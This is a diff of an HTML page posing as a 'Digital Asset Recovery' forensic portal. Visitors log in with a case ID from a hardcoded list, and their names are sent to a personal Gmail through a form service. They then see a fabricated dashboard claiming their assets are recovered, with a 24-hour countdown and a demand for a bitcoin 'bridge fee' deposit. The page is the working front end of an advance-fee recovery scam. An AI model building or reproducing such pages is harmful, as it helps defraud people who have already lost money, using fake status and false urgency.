@@ -7,102 +7,181 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050508; color: white; font-family: 'Inter', sans-serif; }
-        .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); transition: 0.3s; }
-        .glass-card:hover { border-color: rgba(6, 182, 212, 0.5); }
+        .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .progress-bar { width: 100%; height: 8px; background: #111; border-radius: 10px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #22c55e, #06b6d4); transition: width 1.5s ease-in-out; }
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+        .error-shake { animation: shake 0.5s; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
     </style>
 </head>
 <body class="p-4 md:p-12">
 
     <div class="max-w-6xl mx-auto">
         <div class="text-center mb-12">
-            <h1 class="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent italic tracking-tighter">
-                DIGITAL ASSET RECOVERY
+            <h1 class="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent italic tracking-tighter uppercase">
+                Digital Asset Recovery
             </h1>
-            <p class="text-gray-500 uppercase tracking-[0.4em] text-[10px] font-bold">Forensic Investigation & Blockchain Security</p>
+            <div class="flex items-center justify-center space-x-2">
+                <span class="relative flex h-2 w-2">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                </span>
+                <p class="text-gray-500 uppercase tracking-[0.4em] text-[10px] font-bold">Secure Node: Active</p>
+            </div>
         </div>
 
-        <div id="main-content" class="grid md:grid-cols-2 gap-8">
-            
-            <div class="glass-card p-8 rounded-3xl flex flex-col">
-                <div class="mb-6">
-                    <span class="bg-blue-500/10 text-blue-400 text-[10px] px-3 py-1 rounded-full font-bold uppercase tracking-widest">New Clients</span>
-                    <h2 class="text-2xl font-bold mt-4">File a New Complaint</h2>
-                    <p class="text-gray-400 text-sm mt-2">Submit your case details for a free initial forensic scan.</p>
-                </div>
+        <div id="main-content" class="max-w-md mx-auto">
+            <div id="login-card" class="glass-card p-8 rounded-3xl border-t-4 border-t-cyan-500">
+                <h2 class="text-2xl font-bold mb-2 italic text-cyan-500">Authorized Access</h2>
+                <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest text-center">Encrypted Case Node Login</p>
                 
-                <form action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST" class="space-y-4">
-                    <input type="hidden" name="_subject" value="NEW COMPLAINT SUBMISSION">
-                    <input type="text" name="name" placeholder="Full Legal Name" required class="w-full bg-black/40 border border-white/10 p-4 rounded-xl focus:border-blue-500 outline-none text-white">
-                    <input type="email" name="email" placeholder="Email Address" required class="w-full bg-black/40 border border-white/10 p-4 rounded-xl focus:border-blue-500 outline-none text-white">
-                    <textarea name="details" placeholder="Describe the incident (Exchange, amount lost, etc.)" required class="w-full bg-black/40 border border-white/10 p-4 rounded-xl h-32 focus:border-blue-500 outline-none text-white"></textarea>
-                    <button type="submit" class="w-full bg-white text-black font-bold py-4 rounded-xl hover:bg-gray-200 transition uppercase text-xs tracking-widest">Submit Complaint</button>
-                </form>
-            </div>
-
-            <div class="glass-card p-8 rounded-3xl border-t-4 border-t-cyan-500 flex flex-col bg-gradient-to-b from-cyan-500/5 to-transparent">
-                <div class="mb-6">
-                    <span class="bg-cyan-500/20 text-cyan-400 text-[10px] px-3 py-1 rounded-full font-bold uppercase tracking-widest">Authorized Access</span>
-                    <h2 class="text-2xl font-bold mt-4">Case ID Login</h2>
-                    <p class="text-gray-400 text-sm mt-2">Enter your #DAR ID to authenticate and view recovery status.</p>
-                </div>
-                
-                <form id="login-form" action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST" class="space-y-4 mt-auto">
-                    <input type="hidden" name="_subject" value="CASE LOGIN ATTEMPT">
-                    <div class="space-y-1">
-                        <label class="text-[10px] text-cyan-500 font-bold ml-1">ASSIGNED CASE ID</label>
-                        <input type="text" id="case_id_input" name="case_id" placeholder="e.g. DAR-2026-8942" required class="w-full bg-black/60 border border-cyan-500/30 p-4 rounded-xl focus:border-cyan-500 outline-none text-white font-mono">
+                <form id="login-form" action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST" class="space-y-4">
+                    <div>
+                        <label class="text-[9px] uppercase text-gray-400 font-bold mb-1 block">Case Identification Code</label>
+                        <input type="text" id="case_id_input" name="case_id" placeholder="DAR-2026-XXXX" required class="w-full bg-black/60 border border-cyan-500/30 p-4 rounded-xl outline-none text-white font-mono focus:border-cyan-500 transition">
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-[10px] text-gray-500 font-bold ml-1">VERIFICATION NAME</label>
-                        <input type="text" name="name" placeholder="Name on file" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:border-cyan-500 outline-none text-white">
+                    <div>
+                        <label class="text-[9px] uppercase text-gray-400 font-bold mb-1 block">Full Name</label>
+                        <input type="text" name="auth_name" placeholder="Name on File" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl outline-none text-white focus:border-cyan-500 transition">
                     </div>
-                    <button type="submit" id="login-btn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-cyan-500/20 uppercase text-xs tracking-widest">Authenticate & Sync</button>
+                    
+                    <p id="error-msg" class="hidden text-red-500 text-[10px] font-bold uppercase italic tracking-wider text-center">Access Denied: Case ID Not Found.</p>
+                    
+                    <button type="submit" id="login-btn" class="w-full bg-cyan-600 text-white font-bold py-4 rounded-xl uppercase text-xs hover:bg-cyan-500 transition mt-2">Open Secure Bridge</button>
                 </form>
             </div>
         </div>
 
-        <div id="success-box" class="hidden glass-card p-16 rounded-3xl text-center border-cyan-500/50 max-w-2xl mx-auto">
-            <div class="text-6xl mb-6">🛡️</div>
-            <h2 class="text-3xl font-bold mb-2 uppercase tracking-tighter">Identity Verified</h2>
-            <p class="text-gray-400 mb-8">Case <span id="display_id" class="text-cyan-400 font-bold font-mono"></span> is active and synced with the forensic node.</p>
-            <div class="p-6 bg-cyan-500/10 border border-cyan-500/20 rounded-2xl text-left text-xs text-gray-300 leading-relaxed italic">
-                <span class="text-cyan-500 font-bold not-italic mr-2">[SYSTEM]</span> Credentials authorized. Your recovery specialist has been notified. Final settlement instructions have been dispatched to your registered email.
-            </div>
-            <button onclick="window.location.reload()" class="mt-8 text-gray-500 text-xs underline">Back to Main Portal</button>
-        </div>
+        <div id="success-box" class="hidden max-w-5xl mx-auto space-y-6">
+            <div class="glass-card p-8 rounded-3xl border border-cyan-500/30">
+                <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
+                    <div>
+                        <h2 class="text-3xl font-bold uppercase tracking-tighter italic text-white">Case Dashboard</h2>
+                        <div class="flex items-center space-x-2 mt-1">
+                            <span class="text-cyan-400 font-mono text-sm" id="display_id"></span>
+                            <span id="id_badge" class="text-[9px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded border border-green-500/30 uppercase font-bold italic">Authenticated</span>
+                        </div>
+                    </div>
+                </div>
 
+                <div class="mb-8 p-6 bg-cyan-500/5 rounded-2xl border border-cyan-500/10">
+                    <div class="flex justify-between mb-3 text-xs font-bold uppercase italic">
+                        <span class="flex items-center gap-2"><span class="pulse h-2 w-2 rounded-full bg-cyan-400"></span>Status: <span id="status_text"></span></span>
+                        <span id="progress_percent" class="text-cyan-400"></span>
+                    </div>
+                    <div class="progress-bar mb-4"><div id="progress_bar_fill" class="progress-fill"></div></div>
+                    
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
+                        <div class="bg-black/40 p-3 rounded-lg border border-white/5">
+                            <p class="text-[9px] text-gray-500 uppercase font-bold">Node</p>
+                            <p id="node_loc" class="text-[10px] font-mono text-white mt-1 uppercase"></p>
+                        </div>
+                        <div class="bg-black/40 p-3 rounded-lg border border-white/5">
+                            <p class="text-[9px] text-gray-500 uppercase font-bold">Assets</p>
+                            <p class="text-[10px] font-mono text-green-400 mt-1 uppercase font-bold">Recovered</p>
+                        </div>
+                        <div class="bg-black/40 p-3 rounded-lg border border-white/5">
+                            <p class="text-[9px] text-gray-500 uppercase font-bold">Security</p>
+                            <p class="text-[10px] font-mono text-white mt-1 uppercase">AES-256</p>
+                        </div>
+                        <div class="bg-black/40 p-3 rounded-lg border border-white/5">
+                            <p class="text-[9px] text-gray-500 uppercase font-bold">Expiry</p>
+                            <p id="timer" class="text-[10px] font-mono text-orange-400 mt-1">23:59:59</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="p-6 bg-black/40 border border-white/10 rounded-2xl">
+                        <h3 class="text-sm font-bold uppercase mb-4 text-gray-400 italic">Audit Summary</h3>
+                        <p id="doc_msg" class="text-[11px] text-gray-400 italic leading-relaxed"></p>
+                    </div>
+                    <div class="p-6 bg-black/40 border border-orange-500/20 rounded-2xl">
+                        <h3 class="text-sm font-bold uppercase mb-4 text-orange-400 italic">Settlement Protocol</h3>
+                        <div class="bg-black/80 p-3 rounded-lg border border-orange-500/30 mb-3">
+                            <p class="text-[9px] text-orange-500 font-bold uppercase italic italic">Bridge Fee Deposit (BTC)</p>
+                            <p class="text-[10px] font-mono break-all text-white mt-1">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
+                        </div>
+                        <button class="w-full bg-orange-600/10 border border-orange-500/40 text-orange-400 font-bold py-2 rounded-lg uppercase text-[9px]">Awaiting Confirmation</button>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
+        const approvedCases = {
+            "DAR-2026-8942": {
+                status: "VERIFIED / STAGED",
+                progress: "92%",
+                node: "SECURE NODE 04",
+                docStatus: "Forensic audit complete. Assets staged in Escrow Node 04. Final bridge settlement required for release."
+            }
+        };
+
+        // Generate codes 1001-1050
+        for (let i = 1001; i <= 1050; i++) {
+            const code = `DAR-2026-${i}`;
+            approvedCases[code] = {
+                status: "INITIALIZING NODE",
+                progress: "15%",
+                node: "GEN-NODE-ALLOCATED",
+                docStatus: "Bridge established. Awaiting identity verification (POI) to begin asset scan."
+            };
+        }
+
         const loginForm = document.getElementById('login-form');
-        const mainContent = document.getElementById('main-content');
-        const successBox = document.getElementById('success-box');
-        const displayId = document.getElementById('display_id');
+        const loginCard = document.getElementById('login-card');
+        const errorMsg = document.getElementById('error-msg');
         const caseInput = document.getElementById('case_id_input');
         const btn = document.getElementById('login-btn');
 
         loginForm.onsubmit = async (e) => {
             e.preventDefault();
-            btn.innerText = "AUTHENTICATING...";
-            btn.disabled = true;
-
-            const formData = new FormData(loginForm);
-            const response = await fetch(loginForm.action, {
-                method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            });
-
-            if (response.ok) {
-                displayId.innerText = "#" + caseInput.value.toUpperCase();
-                mainContent.classList.add('hidden');
-                successBox.classList.remove('hidden');
-            } else {
-                alert("Auth Error. Please check your connection.");
-                btn.innerText = "Authenticate & Sync";
-                btn.disabled = false;
+            const inputId = caseInput.value.trim().toUpperCase();
+            
+            if (!approvedCases[inputId]) {
+                loginCard.classList.add('error-shake');
+                errorMsg.classList.remove('hidden');
+                setTimeout(() => loginCard.classList.remove('error-shake'), 500);
+                return; 
             }
+
+            btn.innerText = "OPENING SECURE BRIDGE...";
+            btn.disabled = true;
+            errorMsg.classList.add('hidden');
+
+            const caseData = approvedCases[inputId];
+            await fetch(loginForm.action, { method: "POST", body: new FormData(loginForm), headers: { 'Accept': 'application/json' } });
+
+            document.getElementById('main-content').classList.add('hidden');
+            document.getElementById('success-box').classList.remove('hidden');
+            document.getElementById('display_id').innerText = inputId;
+            document.getElementById('status_text').innerText = caseData.status;
+            document.getElementById('node_loc').innerText = caseData.node;
+            document.getElementById('doc_msg').innerText = caseData.docStatus;
+            
+            setTimeout(() => {
+                document.getElementById('progress_bar_fill').style.width = caseData.progress;
+                document.getElementById('progress_percent').innerText = caseData.progress;
+            }, 300);
+
+            startTimer();
         };
+
+        function startTimer() {
+            let time = 86399;
+            const timerEl = document.getElementById('timer');
+            setInterval(() => {
+                let h = Math.floor(time / 3600);
+                let m = Math.floor((time % 3600) / 60);
+                let s = time % 60;
+                timerEl.innerText = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+                time--;
+            }, 1000);
+        }
     </script>
 </body>
 </html>
